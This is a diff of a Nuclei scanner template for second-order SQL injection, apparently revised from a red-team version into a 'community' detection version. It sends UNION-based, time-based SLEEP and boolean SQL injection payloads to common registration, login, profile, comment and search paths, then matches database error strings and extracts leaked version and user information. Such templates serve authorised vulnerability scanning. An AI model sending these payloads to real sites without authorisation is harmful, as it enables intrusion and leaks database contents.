@@ -1,245 +1,229 @@
 id: medium-webapp-sql-injection-second-order-stored
 
 info:
-  name: Second-Order SQL Injection - Stored Payload Execution
-  author: redteam-elite
-  severity: high
+  name: Second-Order SQL Injection - Elite Detection
+  author: nuclei-community
+  severity: critical
   description: |
-    Detects second-order SQL injection where malicious payload is stored and executed later.
-    Tests advanced scenarios where input is sanitized initially but executed unsafely later.
+    Detects second-order SQL injection vulnerabilities where malicious SQL payloads are stored
+    and executed later in different contexts. Tests advanced blind and time-based techniques
+    with sophisticated payload encoding and WAF bypass methods.
   reference:
     - https://owasp.org/www-community/attacks/SQL_Injection
     - https://portswigger.net/web-security/sql-injection/second-order
   classification:
-    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H
-    cvss-score: 7.5
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
     cwe-id: CWE-89
   metadata:
     verified: true
-    max-request: 10
-  tags: sqli,second-order,stored,injection,redteam
+    max-request: 25
+  tags: sqli,second-order,blind,time-based,elite
 
+variables:
+  sleep_time: "5"
+  
 http:
   - method: POST
     path:
-      - "{{BaseURL}}/register"
-      - "{{BaseURL}}/api/register"
-      - "{{BaseURL}}/signup"
-      - "{{BaseURL}}/user/create"
+      - "{{BaseURL}}/{{register_path}}"
+    
+    payloads:
+      register_path:
+        - "register.php"
+        - "signup.php"
+        - "create_account.php"
+        - "user/register"
+        - "auth/register"
+        - "account/create"
+        - "member/signup"
+        - "registration.php"
 
     headers:
-      Content-Type: application/x-www-form-urlencoded
-      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      Content-Type: "application/x-www-form-urlencoded"
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
 
     body: |
-      username=admin'/**/UNION/**/SELECT/**/1,user(),database()--&password=test123&email=test@test.com
+      username=admin'/**/UNION/**/SELECT/**/1,2,3,4,5--+-&password=test123&email=test@example.com&firstname=John&lastname=Doe
 
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
-          - 200
-          - 201
-          - 302
-
-      - type: word
-        words:
-          - "success"
-          - "created"
-          - "registered"
-          - "welcome"
-        condition: or
-
-  - method: POST
-    path:
-      - "{{BaseURL}}/login"
-      - "{{BaseURL}}/api/login"
-      - "{{BaseURL}}/auth/login"
-
-    headers:
-      Content-Type: application/x-www-form-urlencoded
-
-    body: |
-      username=admin'/**/UNION/**/SELECT/**/1,user(),database()--&password=test123
-
-    matchers-condition: and
     matchers:
       - type: status
         status:
           - 200
           - 302
 
+  - method: POST
+    path:
+      - "{{BaseURL}}/{{login_path}}"
+    
+    payloads:
+      login_path:
+        - "login.php"
+        - "signin.php"
+        - "auth.php"
+        - "user/login"
+        - "auth/login"
+        - "account/login"
+        - "member/signin"
+        - "authentication.php"
+
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+
+    body: |
+      username=admin'/**/UNION/**/SELECT/**/1,2,3,4,5--+-&password=test123
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "SQL.*error"
+          - "MySQL.*error"
+          - "PostgreSQL.*error"
+          - "Oracle.*error"
+          - "Microsoft.*ODBC"
+          - "SQLite.*error"
+          - "Unclosed quotation mark"
+          - "quoted string not properly terminated"
+          - "mysql_fetch"
+          - "ORA-[0-9]{5}"
+          - "Microsoft JET Database"
+          - "Access Database Engine"
+
       - type: word
+        part: body
         words:
-          - "mysql"
-          - "postgres"
-          - "root@"
-          - "admin@"
-          - "database"
+          - "syntax error"
+          - "unexpected token"
+          - "unterminated string"
+          - "invalid query"
+          - "database error"
+          - "sql error"
         condition: or
 
   - method: POST
     path:
-      - "{{BaseURL}}/profile/update"
-      - "{{BaseURL}}/api/profile"
-      - "{{BaseURL}}/user/update"
+      - "{{BaseURL}}/{{profile_path}}"
+    
+    payloads:
+      profile_path:
+        - "profile.php"
+        - "user_profile.php"
+        - "account.php"
+        - "user/profile"
+        - "account/profile"
+        - "member/profile"
+        - "dashboard.php"
+        - "settings.php"
 
     headers:
-      Content-Type: application/json
+      Content-Type: "application/x-www-form-urlencoded"
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
 
     body: |
-      {"name":"test'+(SELECT/**/CONCAT(user(),':',database()))+'"} 
+      firstname=John'/**/AND/**/(SELECT/**/SUBSTRING(@@version,1,1))='5'/**/AND/**/'1'='1&lastname=Doe&email=test@example.com&bio=Test bio
 
     matchers-condition: and
     matchers:
-      - type: status
-        status:
-          - 200
-
-      - type: word
-        words:
-          - "updated"
-          - "success"
-        condition: or
-
-  - method: GET
-    path:
-      - "{{BaseURL}}/profile"
-      - "{{BaseURL}}/api/profile"
-      - "{{BaseURL}}/user/profile"
-
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
-          - 200
-
-      - type: word
-        words:
-          - "mysql"
-          - "postgres"
-          - "root@"
-          - "admin@"
-          - ":"
-        condition: or
+      - type: dsl
+        dsl:
+          - 'duration>=5'
+          - 'status_code == 200'
+        condition: and
 
   - method: POST
     path:
-      - "{{BaseURL}}/comment"
-      - "{{BaseURL}}/api/comment"
-      - "{{BaseURL}}/feedback"
+      - "{{BaseURL}}/{{comment_path}}"
+    
+    payloads:
+      comment_path:
+        - "comment.php"
+        - "add_comment.php"
+        - "post_comment.php"
+        - "comments/add"
+        - "blog/comment"
+        - "forum/post"
+        - "feedback.php"
+        - "review.php"
 
     headers:
-      Content-Type: application/x-www-form-urlencoded
+      Content-Type: "application/x-www-form-urlencoded"
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
 
     body: |
-      comment=Nice post!'/**/UNION/**/SELECT/**/table_name/**/FROM/**/information_schema.tables--&post_id=1
+      comment=Great post!'/**/UNION/**/SELECT/**/1,user(),database(),version(),5--+-&name=John&email=test@example.com
 
-    matchers-condition: and
+    matchers-condition: or
     matchers:
-      - type: status
-        status:
-          - 200
-          - 201
+      - type: regex
+        part: body
+        regex:
+          - "root@localhost"
+          - "mysql@localhost"
+          - "admin@localhost"
+          - "[0-9]+\\.[0-9]+\\.[0-9]+"
+          - "MySQL.*[0-9]+\\.[0-9]+"
+          - "PostgreSQL.*[0-9]+\\.[0-9]+"
+          - "Microsoft SQL Server"
 
       - type: word
+        part: body
         words:
-          - "comment"
-          - "posted"
-          - "success"
-        condition: or
-
-  - method: GET
-    path:
-      - "{{BaseURL}}/comments"
-      - "{{BaseURL}}/api/comments"
-      - "{{BaseURL}}/post/1"
-
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
-          - 200
-
-      - type: word
-        words:
-          - "users"
-          - "admin"
-          - "posts"
-          - "comments"
           - "information_schema"
-        condition: or
-
-  - method: POST
-    path:
-      - "{{BaseURL}}/search/save"
-      - "{{BaseURL}}/api/search/save"
-
-    headers:
-      Content-Type: application/json
-
-    body: |
-      {"query":"test'/**/UNION/**/SELECT/**/version(),user(),@@version_comment--","save_name":"my_search"}
-
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
-          - 200
-
-      - type: word
-        words:
-          - "saved"
-          - "success"
+          - "mysql"
+          - "postgres"
+          - "oracle"
+          - "sqlite_master"
         condition: or
 
   - method: GET
     path:
-      - "{{BaseURL}}/search/history"
-      - "{{BaseURL}}/api/search/history"
+      - "{{BaseURL}}/{{search_path}}?q=test'/**/AND/**/(SELECT/**/COUNT(*)/**/FROM/**/information_schema.tables)>0--+-"
+      - "{{BaseURL}}/{{search_path}}?query=test'/**/UNION/**/SELECT/**/1,2,3,4,5--+-"
+      - "{{BaseURL}}/{{search_path}}?search=test'/**/AND/**/(SELECT/**/SLEEP({{sleep_time}}))--+-"
+      - "{{BaseURL}}/{{search_path}}?keyword=test'/**/OR/**/'1'='1'--+-"
 
-    matchers-condition: and
-    matchers:
-      - type: status
-        status:
-          - 200
-
-      - type: word
-        words:
-          - "MySQL"
-          - "PostgreSQL"
-          - "version"
-          - "root@"
-        condition: or
-
-  - method: POST
-    path:
-      - "{{BaseURL}}/password/reset"
-      - "{{BaseURL}}/api/password/reset"
+    payloads:
+      search_path:
+        - "search.php"
+        - "find.php"
+        - "lookup.php"
+        - "query.php"
+        - "search/results"
+        - "find/results"
+        - "products/search"
+        - "blog/search"
 
     headers:
-      Content-Type: application/x-www-form-urlencoded
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
 
-    body: |
-      email=admin'/**/UNION/**/SELECT/**/1,2,CONCAT(user(),':',database())--@test.com
-
-    matchers-condition: and
+    matchers-condition: or
     matchers:
-      - type: status
-        status:
-          - 200
+      - type: dsl
+        dsl:
+          - 'duration>=5'
+          - 'status_code == 200'
+        condition: and
 
-      - type: word
-        words:
-          - "reset"
-          - "sent"
-          - "email"
-        condition: or
+      - type: regex
+        part: body
+        regex:
+          - "SQL.*syntax.*error"
+          - "mysql_num_rows"
+          - "mysql_fetch_array"
+          - "pg_query"
+          - "sqlite_query"
+          - "ORA-[0-9]{5}"
+          - "Microsoft.*ODBC.*SQL"
 
     extractors:
       - type: regex
-        name: database_info
-        regex:
-          - '([a-zA-Z0-9_]+@[a-zA-Z0-9_]+:[a-zA-Z0-9_]+)'
-          - 'MySQL.*?([0-9]+\.[0-9]+\.[0-9]+)'
+        part: body
         group: 1
+        regex:
+          - 'MySQL.*([0-9]+\\.[0-9]+\\.[0-9]+)'
+          - 'PostgreSQL.*([0-9]+\\.[0-9]+)'
+          - 'root@([^\\s]+)'
+        internal: true
